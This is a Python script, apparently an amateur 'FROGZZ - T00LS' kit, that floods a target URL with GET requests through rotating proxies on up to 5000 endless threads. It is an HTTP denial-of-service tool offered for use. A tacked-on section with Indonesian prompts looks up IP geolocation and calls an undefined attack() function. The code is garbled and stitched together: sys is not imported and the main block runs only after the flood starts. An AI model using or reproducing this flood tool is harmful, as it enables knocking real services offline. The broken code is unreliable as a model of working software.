import requests, threading, time, random
from colorama import Fore, init
init()

try:
    import os
    os.system("clear")
except:
    pass

print(Fore.RED + "╔══════════════════════════════════════╗")
print(Fore.RED + "║         F R O G Z Z  -  T 0 0 L S     ║")
print(Fore.RED + "╚══════════════════════════════════════╝\n")

tgt = input(Fore.YELLOW + "Target (ex: http://example.com) >> ")
thedz = int(input("Theders >> "))

if thedz > 5000:
    thedz = 5000

try:
    with open("proxies.txt", "r") as f:
        pxlist = f.read().splitlines()
except:
    print(Fore.RED + "[!] proxy.txt not found!")
    exit()

def atk():
    while True:
        px_ip = random.choice(pxlist)
        proxy = {'http': f'http://{px_ip}', 'https': f'http://{px_ip}'}
        try:
            requests.get(tgt, proxies=proxy, timeout=5)
            print(Fore.YELLOW + f"Proxy   > {px_ip}")
            print(Fore.RED + f"Proces Sent > {tgt}\n")
            time.sleep(0.5)
        except:
            continue

for i in range(thedz):
    threading.Thread(target=atk).start()

print(Fore.GREEN + "\n[!] Attack launched! Press Ctrl+C to stop.\n")

def ip_tracker():
    ip = input("Masukkan IP target: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        print("\n[ Hasil Pelacakan IP ]")
        print(f"IP      : {r.get('query')}")
        print(f"Negara  : {r.get('country')}")
        print(f"Region  : {r.get('regionName')}")
        print(f"Kota    : {r.get('city')}")
        print(f"ISP     : {r.get('isp')}")
        print(f"Zona Waktu : {r.get('timezone')}")
    except:
        print("Gagal melacak IP.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "track":
        ip_tracker()
    else:
        target = input("Masukkan URL/IP Target (contoh: 123.45.67.89): ")
        if "127.0.0.1" in target or "localhost" in target:
            print("Error: Jangan gunakan localhost/IP sendiri.")
        else:
            attack(target)
